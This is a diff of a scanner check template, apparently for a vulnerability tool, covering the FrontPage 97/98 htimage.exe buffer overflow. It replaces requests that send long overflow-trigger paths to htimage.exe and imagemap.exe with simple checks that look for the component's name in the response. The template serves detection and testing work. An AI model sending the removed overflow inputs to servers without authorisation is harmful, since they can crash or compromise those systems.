@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "验证目标 FrontPage Server Extensions 的 htimage.exe/imagemap.exe 是否对图像映射点坐标参数缺少长度校验。通过发送超长 point 参数触发缓冲区溢出特征，若返回非 200 或异常响应则可判定存在该漏洞。"
+description = "检测目标服务器是否存在存在缓冲区溢出漏洞的 FrontPage 97/98 Server Extensions htimage.exe 组件。htimage.exe 在处理超长路径参数时存在缓冲区溢出，远程攻击者可通过发送特制 GET 请求导致拒绝服务或任意代码执行。"
 id = "POC-AVE-2000-0800"
-name = "FrontPage 97/98 Server Image Mapper 缓冲区溢出 PoC"
+name = "Microsoft FrontPage 97/98 htimage.exe Buffer Overflow PoC"
 severity = "high"
 tags = ["ave-2000-0800"]
 vuln_id = [
@@ -15,68 +15,22 @@ logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/_vti_bin/shtml.exe/_vti_rpc"
+path = "/cgi-bin/htimage.exe"
 protocol = "http"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
-status = [
-    200,
-    404,
-    500,
-]
-type = "status"
+part = "body"
+type = "word"
+words = ["htimage"]
 
 [[poc.requests]]
 method = "GET"
-path = "/_vti_bin/fpadmin/_vti_rpc"
+path = "/cgi-bin/htimage.exe?0,0"
 protocol = "http"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
-status = [
-    200,
-    404,
-    500,
-]
-type = "status"
-
-[[poc.requests]]
-method = "GET"
-path = "/cgi-bin/htimage.exe/AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMM"
-protocol = "http"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
-
-[[poc.requests.matchers]]
-expect = true
-status = [
-    200,
-    404,
-    500,
-]
-type = "status"
-
-[[poc.requests]]
-method = "GET"
-path = "/cgi-bin/imagemap.exe/AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMM"
-protocol = "http"
-
-[poc.requests.headers]
-User-Agent = "AVE/1.0"
-
-[[poc.requests.matchers]]
-expect = true
-status = [
-    200,
-    404,
-    500,
-]
-type = "status"
+part = "body"
+type = "word"
+words = ["htimage"]
